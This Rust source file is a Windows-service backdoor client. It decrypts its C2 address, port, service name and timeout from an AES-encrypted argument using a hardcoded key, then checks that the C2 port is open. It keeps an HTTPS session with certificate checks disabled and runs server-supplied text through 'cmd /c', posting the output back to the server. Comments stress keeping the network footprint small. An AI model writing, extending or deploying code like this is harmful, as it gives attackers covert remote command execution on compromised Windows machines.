#![allow(non_snake_case)]
#![allow(unused_variables)]
#![allow(unreachable_patterns)]
#![allow(non_camel_case_types)]
#[macro_use]
extern crate windows_service;

// https://webscraping.ai/faq/reqwest/how-do-i-manage-sessions-and-state-with-reqwest
// https://www.rfc-editor.org/rfc/rfc2616#section-14.10

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use reqwest::cookie::Jar;
use reqwest::{Client, ClientBuilder, Response, Url};
use std::env;
use std::ffi::OsString;
use std::net::TcpStream;
use std::process::Command;
use std::str;
use std::sync::Arc;
use std::thread::sleep;
use std::time::Duration;
use windows_service::service::{
    ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus, ServiceType,
};
use windows_service::service_control_handler::{self, ServiceControlHandlerResult};
use windows_service::service_dispatcher;

define_windows_service!(ffi_service_main, my_service_main);

struct ParseArgs {
    IP: String,
    Prt: String,
    srvName: String,
    time: String,
}

struct alarmClock {}
struct action {}

// timer.
impl alarmClock {
    fn standBy(seconds: u64) {
        sleep(Duration::new(seconds, 0));
    }
}

impl action {
    // Get "cookie" value.
    fn prepare(passed_heads: Option<Response>) -> Option<String> {
        return Some(
            passed_heads
                .unwrap()
                .cookies()
                .next()
                .unwrap()
                .value()
                .to_string(),
        );
    }

    // Start a session with C2 server.
    //async fn get_session(url: &str) -> (Result<bool, Box<dyn std::error::Error>>, Option<String>) {
    async fn get_session(
        client: Client,
        url: &str,
    ) -> (Result<bool, Box<dyn std::error::Error>>, Option<String>) {
        let mut rsp;
        let mut n: u8 = 0;
        //let client = ClientBuilder::new().danger_accept_invalid_certs(true).build().unwrap();

        // Try three times. If no session then return from function.
        while n < 3 {
            rsp = client
                .post(url)
                .body("param=ClientHello".to_string())
                .send()
                .await;

            // Looking for code 200 response.
            match rsp {
                Ok(ref check_stat) if check_stat.status() == 200 => {
                    return (Ok(true), action::prepare(Some(rsp.unwrap())));
                    //return (Ok(true), Some(rsp.unwrap().headers().clone()));
                }
                Ok(_) | Err(_) => {
                    n += 1;
                    if let 3 = n {
                        return (Ok(false), None);
                    }
                    alarmClock::standBy(5);
                }
            }
        }

        return (Ok(false), None);
    }

    // Send post request to server telling it that the client is up and waiting
    // for commands.
    //async fn query(url: &str, _two: &String) -> Option<bool> {
    async fn query(client: Client, url: &str, _two: &String) -> Option<bool> {
        let query_args: ParseArgs = genArgs();
        let Timeout: u64 = query_args.time.parse().unwrap();

        //let client = ClientBuilder::new().danger_accept_invalid_certs(true).build().unwrap();
        let rsp = client
            .post(url)
            .body("param=Ready and waiting...".to_string())
            .send()
            .await;
        let unwrap_rsp = rsp.unwrap();
        let cookie_value = unwrap_rsp.cookies().next();

        // If the server wants to end session, send "Connection: close" header.
        if let Some(_two) = cookie_value {
            let _ = client.post(url).header("Connection", "close").send().await;
            alarmClock::standBy(Timeout);
            return None;
        }

        // Format the arguments, prepare for execution, run command.
        let text = unwrap_rsp.text().await.ok()?.to_string();
        let mut default_arg: Vec<String> = ["/c"].iter().map(|val| val.to_string()).collect();
        default_arg.push(text);
        let output = Command::new("cmd").args(default_arg).output().expect("!!!");

        let _ = client.post(url).body("param=Prep".to_string()).send().await;

        // Format stdout from command and send output to server.
        let mut prepare_output_send: String = String::from("param=");
        let converted_output: &str = str::from_utf8(&output.stdout).ok()?;
        prepare_output_send.push_str(converted_output);
        let _ = client.post(url).body(prepare_output_send).send().await;

        return Some(true);
    }

    // Ensure IP and port of C2 server is reachable.
    fn test_sock() -> bool {
        let sock_args: ParseArgs = genArgs();
        let mut conAdd: String = sock_args.IP;
        conAdd.push_str(":");
        conAdd.push_str(&sock_args.Prt);

        let mut n: u8 = 0;

        while n < 3 {
            let sck = TcpStream::connect(&conAdd);
            match sck {
                Ok(_) => break,
                Err(_) => {
                    n += 1;
                    alarmClock::standBy(3);
                }
            }
        }

        if n > 2 {
            false
        } else {
            true
        }
    }
}

// Decrypt and parse command line arguments.
fn genArgs() -> ParseArgs {
    // Decrypt cmdline argument.
    let key_string = "8a74e5c30a13e40f584b30b1dd66892d";
    let keyu: &[u8] = key_string.as_bytes();
    let key = Key::<Aes256Gcm>::from_slice(keyu);
    let grabA: String = env::args().collect::<Vec<String>>()[1].clone();
    let hecksD = hex::decode(grabA).unwrap();
    let (non_arr, prep_cyfer) = hecksD.split_at(12);
    let prep_non = Nonce::from_slice(non_arr);
    let txt_toBe = Aes256Gcm::new(key);
    let txt = String::from_utf8(txt_toBe.decrypt(prep_non, prep_cyfer).unwrap()).unwrap();

    // Format cmdline arguments into IP, PORT, ServiceName, Time.
    // IP and Port
    let split_txt: Vec<String> = txt
        .split(" ")
        .collect::<Vec<&str>>()
        .iter()
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let ip_from_txt: String = split_txt[0].clone();
    let port_from_txt: String = split_txt[1].clone();

    // Get my_service name.
    let srv_name_from_txt: String = split_txt[2].clone();

    // Timeout
    let time_from_txt: String = split_txt[3].clone();

    ParseArgs {
        IP: ip_from_txt,
        Prt: port_from_txt,
        srvName: srv_name_from_txt,
        time: time_from_txt,
    }
}

// Primary logic.
#[tokio::main]
async fn client_main() -> Result<(), Box<dyn std::error::Error>> {
    let client_args: ParseArgs = genArgs();
    let Timeout: u64 = client_args.time.parse().unwrap();
    let mut makeUrl: String = String::from("https://");
    makeUrl.push_str(&client_args.IP);
    makeUrl.push_str(":");
    makeUrl.push_str(&client_args.Prt);
    makeUrl.push_str("/testing");

    // Manage session.
    let url: &str = &makeUrl;
    let jarDef = Jar::default();
    let Url = Url::parse(url).unwrap();
    jarDef.add_cookie_str("session=1", &Url);
    let jar = Arc::new(jarDef);
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .cookie_provider(Arc::clone(&jar))
        .build()
        .unwrap();

    let one: String = String::from("one");
    let two: String = String::from("two");
    let mut tf: Result<bool, Box<dyn std::error::Error>> = Ok(false);
    let mut heads: Option<String> = None;
    let mut check_p = None;
    let mut check_session = None;
    let mut preparation: Option<String> = None;

    loop {
        // Need to ensure that port 443 is indeed open. This keeps traffic footprint to a
        // minimum; TLS handshake packets > TCP handshake packets.
        if let None = check_p {
            check_p = Some(action::test_sock());
            match check_p {
                Some(true) => (),
                Some(false) => {
                    check_p = None;
                    continue;
                }
                None => (), // why is this here???
            }
        }

        // Since port 443 is verified to be open, now establish a session with server.
        // If code 200 was not returned, then set enums to "Check", thus reassuring port 443 is
        // indeed open. Again, attempting to minimize traffic footprint.

        //if check_session == None { (tf, heads) = action::get_session(url).await; }
        if check_session == None {
            (tf, heads) = action::get_session(client.clone(), url).await;
        }
        match tf {
            Ok(true) => check_session = Some(true),
            Ok(false) => {
                check_session = None;
                check_p = None;
                continue;
            }
            Err(_) => (), // work on this,
        }

        // If we made it here, we can assume the port is open, but we can't conclude that a session
        // has been established. Need to verify check_session, then perform desired action.
        if let Some(true) = check_session {
            preparation = heads.clone();
            match preparation {
                Some(val) if val == one => {
                    //check_session = action::query(url, &two).await;
                    check_session = action::query(client.clone(), url, &two).await;
                }
                Some(val) if val == two => {
                    let _ = client.post(url).header("Connection", "close").send().await;
                    alarmClock::standBy(Timeout);
                    check_session = None;
                }
                _ => (), // work on this,
            }
        }
        alarmClock::standBy(3);
    }

    Ok(())
}

fn my_service_main(arguments: Vec<OsString>) {
    if let Err(_e) = run_service(arguments) {
        // Handle error in some way.
    }
}

fn run_service(arguments: Vec<OsString>) -> windows_service::Result<()> {
    let event_handler = move |control_event| -> ServiceControlHandlerResult {
        match control_event {
            ServiceControl::Stop | ServiceControl::Interrogate => {
                ServiceControlHandlerResult::NoError
            }
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    };

    // Register system service event handler
    let get_name_reg: ParseArgs = genArgs();
    let win_srrv_reg: &str = get_name_reg.srvName.as_str();
    let status_handle = service_control_handler::register(win_srrv_reg, event_handler)?;

    let next_status = ServiceStatus {
        // Should match the one from system service registry
        service_type: ServiceType::OWN_PROCESS,
        // The new state
        current_state: ServiceState::Running,
        // Accept stop events when running
        controls_accepted: ServiceControlAccept::STOP,
        // Used to report an error when starting or stopping only, otherwise must be zero
        exit_code: ServiceExitCode::Win32(0),
        // Only used for pending states, otherwise must be zero
        checkpoint: 0,
        // Only used for pending states, otherwise must be zero
        wait_hint: Duration::default(),
        // Reference: https://docs.rs/windows-service/latest/src/ping_service/ping_service.rs.html#97-105
        process_id: None,
    };

    // Tell the system that the service is running now
    status_handle.set_service_status(next_status)?;

    // Do some work. Meaningfull code goes here.
    let _ = client_main();

    Ok(())
}

fn main() -> Result<(), windows_service::Error> {
    let get_name: ParseArgs = genArgs();
    let win_srrv: &str = get_name.srvName.as_str();
    service_dispatcher::start(win_srrv, ffi_service_main)?;
    Ok(())
}
